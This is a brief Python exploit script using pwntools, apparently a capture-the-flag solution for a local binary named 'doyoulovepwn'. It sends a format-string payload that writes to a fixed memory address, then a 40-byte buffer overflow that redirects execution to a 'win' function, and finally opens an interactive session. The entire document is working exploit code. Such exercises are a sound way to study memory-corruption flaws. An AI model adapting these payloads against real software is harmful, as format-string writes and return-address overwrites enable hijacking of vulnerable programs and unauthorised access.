from pwn import*

p = process('./doyoulovepwn')
#gdb.attach(p, api=True)

win = 0x0000000000401182

size = 0x404010
payload = b'%100x%8$n' + b'a'*7 + p64(size) 
p.sendline(payload)

payload = b"a"*40 + p64(win)
p.sendline(payload)
p.interactive()
